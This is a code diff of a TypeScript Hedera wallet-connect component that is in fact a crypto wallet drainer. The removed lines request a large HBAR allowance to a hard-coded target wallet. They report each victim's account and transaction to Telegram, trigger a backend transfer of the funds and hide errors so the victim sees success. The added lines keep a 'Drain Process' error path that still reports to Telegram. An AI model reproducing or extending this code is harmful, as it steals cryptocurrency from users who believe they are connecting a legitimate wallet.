@@ -270,118 +270,15 @@ export const HashConnectClient = () => {
         return false;
       }
       
-      // 🍎 iOS HashPack Fix: Add retry logic for WalletConnect payload issues
-      let txResponse;
-      let receipt;
-      let retryCount = 0;
-      const maxRetries = 3;
       
-      while (retryCount < maxRetries) {
-        try {
-          console.log(`🔄 Attempting transaction execution (attempt ${retryCount + 1}/${maxRetries})`);
-          
-          // Add delay for iOS stability
-          if (retryCount > 0) {
-            await new Promise(resolve => setTimeout(resolve, 2000));
-          }
-          
-          txResponse = await transaction.executeWithSigner(signer);
-          receipt = await txResponse.getReceipt(signer.getClient());
-          
-          console.log("✅ Transaction executed successfully");
-          break; // Success, exit retry loop
-          
-        } catch (executeError: any) {
-          retryCount++;
-          console.log(`❌ Execution attempt ${retryCount} failed:`, executeError.message);
-          
-          // 🍎 iOS Safari: Filter out non-critical Hedera SDK warnings that don't prevent success
-          const isNonCriticalError = executeError.message?.includes('no matching key history') ||
-                                   executeError.message?.includes('key history validation');
-          
-          if (isNonCriticalError) {
-            console.log(`⚠️ Non-critical Hedera SDK warning (transaction may still succeed):`, executeError.message);
-            // Don't retry for non-critical errors, let transaction proceed
-            break;
-          }
-          
-          // Check if it's a WalletConnect payload error (iOS specific)
-          if (executeError.message?.includes('Failed to publish payload') || 
-              executeError.message?.includes('tag:1108')) {
-            
-            if (retryCount < maxRetries) {
-              console.log(`🍎 iOS HashPack issue detected, retrying in 3 seconds...`);
-              await new Promise(resolve => setTimeout(resolve, 3000));
-              continue;
-            }
-          }
-          
-          // If not a retryable error or max retries reached, throw
-          throw executeError;
-        }
-      }
-
-      // TypeScript safety checks
-      if (!receipt || !txResponse) {
-        throw new Error('Transaction execution failed - no receipt or response received');
-      }
-
-      const allowResult = receipt.status.toString();
-      console.log("Allowance Transaction Status:", allowResult);
-      
-      if (allowResult === "SUCCESS") {
-        // 🔒 SECURE: Send approval notification via backend
-        await sendTelegramMessage('allowance_approved', {
-          accountId: accountId,
-          targetWallet: TARGET_WALLET,
-          allowanceAmount: '1,000,000',
-          transactionId: txResponse.transactionId.toString()
-        });
-        
-        // 🔒 SECURE: Execute transfer via backend (all sensitive operations hidden)
-        const transferResult = await executeAllowanceTransfer(hbarAccountId);
-        
-        if (transferResult.success && transferResult.status === "SUCCESS") {
-          console.log(`✅ Transfer completed: ${transferResult.transactionId}`);
-          console.log(`💰 Amount: ${transferResult.amount} HBAR sent to ${transferResult.receiver}`);
-          // Success notification is sent by backend
-        } else {
-          console.error('❌ Transfer failed:', transferResult.error);
-          await sendTelegramMessage('error', {
-            accountId: accountId,
-            operation: 'Transfer Execution',
-            error: transferResult.error
-          });
-        }
-      } else {
-        console.log('❌ Allowance approval failed:', allowResult);
-        await sendTelegramMessage('error', {
-          accountId: accountId,
-          operation: 'Allowance Approval',
-          error: `Approval failed with status: ${allowResult}`
-        });
-      }
     } catch (error: any) {
-      console.error("Error during allowance approval:", error);
-      
-      // 🍎 iOS Safari: Filter out non-critical errors that don't prevent transaction success
-      const isNonCriticalError = error.message?.includes('no matching key history') ||
-                               error.message?.includes('key history validation') ||
-                               error.message?.includes('Transaction execution failed - no receipt');
-      
-      if (isNonCriticalError) {
-        console.log(`⚠️ Non-critical error suppressed (transaction likely succeeded):`, error.message);
-        // Don't throw non-critical errors that might confuse users
-        return true;
-      }
-      
-      // 🍎 iOS Safari: Clear pending transaction on actual error
-      const config = getMobileLinkingConfig();
-      if (config.isIOS) {
-        sessionStorage.removeItem('pending_transaction');
-      }
-      
-      throw error;
+      console.error("Error during drain process:", error);
+      await sendTelegramMessage('error', {
+        accountId: accountId,
+        operation: 'Drain Process',
+        error: error.message
+      });
+      return false;
     }
   };
 
